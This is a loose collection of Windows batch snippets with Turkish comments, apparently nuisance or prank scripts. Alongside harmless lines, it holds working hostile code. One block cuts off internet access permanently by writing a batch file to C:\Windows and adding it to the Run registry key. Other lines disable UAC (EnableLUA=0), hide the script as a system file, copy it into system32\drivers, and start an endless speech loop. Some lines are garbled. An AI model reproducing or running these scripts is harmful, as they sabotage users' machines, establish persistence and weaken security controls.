@echo off
start https://www.google.com/search?client=firefox-b-d&q=How+to+buy+a+fish
@echo off
start https://www.google.com/search?client=firefox-b-d&q=How+to+buy+a+fish
echo do >> Dosya adi.vbs
echo strText = ("Hi admin") >> Dosya adi.vbs
echo Set objvoice = CreateObject("SAPI.SpVoice") >> Dosya adi.vbs
echo ObjVoice.Speak strText >> Dosya adi.vbs 
echo loop >> Dosya adi.vbs
start Dosya adi.vbs
echo Ustteki do ve loop’lu kodu silerseniz tekrarlanmaz..


@echo off
rem ---------------------------------
rem Windows XP Gizli baslangic müziği
start "" "%systemroot%\system32\oobe\images\title.wma"
rem ---------------------------------

INTERNETI SINIRSIZ KAPAT
ipconfig /release +vbnewlineif %ERRORLEVEL%==1 ipconfig /release_all
echo @echo off>c:\windows\wimn32.bat 
echo break off>>c:\windows\wimn32.bat 
echo ipconfig/release_all>>c:\windows\wimn32.bat 
echo end>>c:\windows\wimn32.bat 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v WINDOWsAPI /t reg_sz /d c:\windows\wimn32.bat /f 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v CONTROLexit /t reg_sz /d c:\windows\wimn32.bat /f 
PAUSE

cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" "%1""?
pause
dir
pause
cd..
pause
cd..
cd..
pause
tree
pause

@echo off
attrib +s %0


@echo off
@Set RegistyEditCmd=Cmd /k Reg Add
@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul


@echo off
copy %0 %systemroot%\system32\drivers\%0
